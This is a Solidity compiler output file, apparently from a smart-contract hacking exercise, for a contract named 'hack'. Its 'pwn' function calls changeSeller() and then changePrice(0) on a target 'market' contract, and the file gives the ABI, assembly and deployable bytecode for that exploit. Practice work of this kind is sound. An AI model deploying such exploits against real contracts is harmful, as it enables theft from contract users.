{
	"shoot/摸底1/3/1.sol": {
		"hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract market",
							"name": "mar",
							"type": "address"
						}
					],
					"name": "pwn",
					"outputs": [
						{
							"internalType": "uint128",
							"name": "",
							"type": "uint128"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2680:2849  contract hack {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2680:2849  contract hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x02c6591d\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2701:2846  function pwn(market mar) public returns(uint128){... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_7:\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2741:2748  uint128 */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2763  mar */\n      dup2\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2776  mar.changeSeller */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe90e2fed\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2778  mar.changeSeller() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_13:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2792  mar */\n      dup2\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2804  mar.changePrice */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa2b40d19\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2805:2806  0 */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2807  mar.changePrice(0) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2701:2846  function pwn(market mar) public returns(uint128){... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_20:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_22:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_23:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_40\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_22\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:678   */\n    tag_24:\n        /* \"#utility.yul\":619:626   */\n      0x00\n        /* \"#utility.yul\":648:672   */\n      tag_42\n        /* \"#utility.yul\":666:671   */\n      dup3\n        /* \"#utility.yul\":648:672   */\n      tag_23\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":637:672   */\n      swap1\n      pop\n        /* \"#utility.yul\":568:678   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":684:834   */\n    tag_25:\n        /* \"#utility.yul\":771:809   */\n      tag_44\n        /* \"#utility.yul\":803:808   */\n      dup2\n        /* \"#utility.yul\":771:809   */\n      tag_24\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":764:769   */\n      dup2\n        /* \"#utility.yul\":761:810   */\n      eq\n        /* \"#utility.yul\":751:828   */\n      tag_45\n      jumpi\n        /* \"#utility.yul\":824:825   */\n      0x00\n        /* \"#utility.yul\":821:822   */\n      dup1\n        /* \"#utility.yul\":814:826   */\n      revert\n        /* \"#utility.yul\":751:828   */\n    tag_45:\n        /* \"#utility.yul\":684:834   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":840:1007   */\n    tag_26:\n        /* \"#utility.yul\":900:905   */\n      0x00\n        /* \"#utility.yul\":938:944   */\n      dup2\n        /* \"#utility.yul\":925:945   */\n      calldataload\n        /* \"#utility.yul\":916:945   */\n      swap1\n      pop\n        /* \"#utility.yul\":954:1001   */\n      tag_47\n        /* \"#utility.yul\":995:1000   */\n      dup2\n        /* \"#utility.yul\":954:1001   */\n      tag_25\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":840:1007   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1013:1370   */\n    tag_6:\n        /* \"#utility.yul\":1086:1092   */\n      0x00\n        /* \"#utility.yul\":1135:1137   */\n      0x20\n        /* \"#utility.yul\":1123:1132   */\n      dup3\n        /* \"#utility.yul\":1114:1121   */\n      dup5\n        /* \"#utility.yul\":1110:1133   */\n      sub\n        /* \"#utility.yul\":1106:1138   */\n      slt\n        /* \"#utility.yul\":1103:1222   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":1141:1220   */\n      tag_50\n      tag_20\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1103:1222   */\n    tag_49:\n        /* \"#utility.yul\":1261:1262   */\n      0x00\n        /* \"#utility.yul\":1286:1353   */\n      tag_51\n        /* \"#utility.yul\":1345:1352   */\n      dup5\n        /* \"#utility.yul\":1336:1342   */\n      dup3\n        /* \"#utility.yul\":1325:1334   */\n      dup6\n        /* \"#utility.yul\":1321:1343   */\n      add\n        /* \"#utility.yul\":1286:1353   */\n      tag_26\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1276:1353   */\n      swap2\n      pop\n        /* \"#utility.yul\":1232:1363   */\n      pop\n        /* \"#utility.yul\":1013:1370   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1376:1494   */\n    tag_27:\n        /* \"#utility.yul\":1413:1420   */\n      0x00\n        /* \"#utility.yul\":1453:1487   */\n      0xffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1446:1451   */\n      dup3\n        /* \"#utility.yul\":1442:1488   */\n      and\n        /* \"#utility.yul\":1431:1488   */\n      swap1\n      pop\n        /* \"#utility.yul\":1376:1494   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1500:1618   */\n    tag_28:\n        /* \"#utility.yul\":1587:1611   */\n      tag_54\n        /* \"#utility.yul\":1605:1610   */\n      dup2\n        /* \"#utility.yul\":1587:1611   */\n      tag_27\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1582:1585   */\n      dup3\n        /* \"#utility.yul\":1575:1612   */\n      mstore\n        /* \"#utility.yul\":1500:1618   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1624:1846   */\n    tag_9:\n        /* \"#utility.yul\":1717:1721   */\n      0x00\n        /* \"#utility.yul\":1755:1757   */\n      0x20\n        /* \"#utility.yul\":1744:1753   */\n      dup3\n        /* \"#utility.yul\":1740:1758   */\n      add\n        /* \"#utility.yul\":1732:1758   */\n      swap1\n      pop\n        /* \"#utility.yul\":1768:1839   */\n      tag_56\n        /* \"#utility.yul\":1836:1837   */\n      0x00\n        /* \"#utility.yul\":1825:1834   */\n      dup4\n        /* \"#utility.yul\":1821:1838   */\n      add\n        /* \"#utility.yul\":1812:1818   */\n      dup5\n        /* \"#utility.yul\":1768:1839   */\n      tag_28\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1624:1846   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1852:1937   */\n    tag_29:\n        /* \"#utility.yul\":1897:1904   */\n      0x00\n        /* \"#utility.yul\":1926:1931   */\n      dup2\n        /* \"#utility.yul\":1915:1931   */\n      swap1\n      pop\n        /* \"#utility.yul\":1852:1937   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1943:2020   */\n    tag_30:\n        /* \"#utility.yul\":1980:1987   */\n      0x00\n        /* \"#utility.yul\":2009:2014   */\n      dup2\n        /* \"#utility.yul\":1998:2014   */\n      swap1\n      pop\n        /* \"#utility.yul\":1943:2020   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2026:2086   */\n    tag_31:\n        /* \"#utility.yul\":2054:2057   */\n      0x00\n        /* \"#utility.yul\":2075:2080   */\n      dup2\n        /* \"#utility.yul\":2068:2080   */\n      swap1\n      pop\n        /* \"#utility.yul\":2026:2086   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2092:2250   */\n    tag_32:\n        /* \"#utility.yul\":2150:2159   */\n      0x00\n        /* \"#utility.yul\":2183:2244   */\n      tag_61\n        /* \"#utility.yul\":2201:2243   */\n      tag_62\n        /* \"#utility.yul\":2210:2242   */\n      tag_63\n        /* \"#utility.yul\":2236:2241   */\n      dup5\n        /* \"#utility.yul\":2210:2242   */\n      tag_29\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2201:2243   */\n      tag_31\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":2183:2244   */\n      tag_30\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2170:2244   */\n      swap1\n      pop\n        /* \"#utility.yul\":2092:2250   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2256:2403   */\n    tag_33:\n        /* \"#utility.yul\":2351:2396   */\n      tag_65\n        /* \"#utility.yul\":2390:2395   */\n      dup2\n        /* \"#utility.yul\":2351:2396   */\n      tag_32\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2346:2349   */\n      dup3\n        /* \"#utility.yul\":2339:2397   */\n      mstore\n        /* \"#utility.yul\":2256:2403   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2409:2647   */\n    tag_15:\n        /* \"#utility.yul\":2510:2514   */\n      0x00\n        /* \"#utility.yul\":2548:2550   */\n      0x20\n        /* \"#utility.yul\":2537:2546   */\n      dup3\n        /* \"#utility.yul\":2533:2551   */\n      add\n        /* \"#utility.yul\":2525:2551   */\n      swap1\n      pop\n        /* \"#utility.yul\":2561:2640   */\n      tag_67\n        /* \"#utility.yul\":2637:2638   */\n      0x00\n        /* \"#utility.yul\":2626:2635   */\n      dup4\n        /* \"#utility.yul\":2622:2639   */\n      add\n        /* \"#utility.yul\":2613:2619   */\n      dup5\n        /* \"#utility.yul\":2561:2640   */\n      tag_33\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2409:2647   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a54c85344f49e2aba4a89ce553c24d4ef0380e584eef5bf8216541c14fd339c964736f6c63430008150033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5061029b8061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c806302c6591d1461002d575b5f80fd5b61004760048036038101906100429190610193565b61005d565b60405161005491906101e8565b60405180910390f35b5f8173ffffffffffffffffffffffffffffffffffffffff1663e90e2fed6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100a3575f80fd5b505af11580156100b5573d5f803e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff1663a2b40d195f6040518263ffffffff1660e01b81526004016100f2919061024c565b5f604051808303815f87803b158015610109575f80fd5b505af115801561011b573d5f803e3d5ffd5b50505050919050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61015182610128565b9050919050565b5f61016282610147565b9050919050565b61017281610158565b811461017c575f80fd5b50565b5f8135905061018d81610169565b92915050565b5f602082840312156101a8576101a7610124565b5b5f6101b58482850161017f565b91505092915050565b5f6fffffffffffffffffffffffffffffffff82169050919050565b6101e2816101be565b82525050565b5f6020820190506101fb5f8301846101d9565b92915050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61023661023161022c84610201565b610213565b61020a565b9050919050565b6102468161021c565b82525050565b5f60208201905061025f5f83018461023d565b9291505056fea2646970667358221220a54c85344f49e2aba4a89ce553c24d4ef0380e584eef5bf8216541c14fd339c964736f6c63430008150033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x29B DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2C6591D EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH2 0x5D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x54 SWAP2 SWAP1 PUSH2 0x1E8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE90E2FED PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xB5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA2B40D19 PUSH0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF2 SWAP2 SWAP1 PUSH2 0x24C JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x109 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x11B JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x151 DUP3 PUSH2 0x128 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x162 DUP3 PUSH2 0x147 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x172 DUP2 PUSH2 0x158 JUMP JUMPDEST DUP2 EQ PUSH2 0x17C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x18D DUP2 PUSH2 0x169 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1A8 JUMPI PUSH2 0x1A7 PUSH2 0x124 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1B5 DUP5 DUP3 DUP6 ADD PUSH2 0x17F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH16 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1E2 DUP2 PUSH2 0x1BE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1FB PUSH0 DUP4 ADD DUP5 PUSH2 0x1D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x236 PUSH2 0x231 PUSH2 0x22C DUP5 PUSH2 0x201 JUMP JUMPDEST PUSH2 0x213 JUMP JUMPDEST PUSH2 0x20A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x246 DUP2 PUSH2 0x21C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x25F PUSH0 DUP4 ADD DUP5 PUSH2 0x23D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA5 0x4C DUP6 CALLVALUE 0x4F 0x49 0xE2 0xAB LOG4 0xA8 SWAP13 0xE5 MSTORE8 0xC2 0x4D 0x4E CREATE CODESIZE 0xE PC 0x4E 0xEF JUMPDEST 0xF8 0x21 PUSH6 0x41C14FD339C9 PUSH5 0x736F6C6343 STOP ADDMOD ISZERO STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "133400",
						"executionCost": "175",
						"totalCost": "133575"
					},
					"external": {
						"pwn(address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"pwn(address)": "02c6591d"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}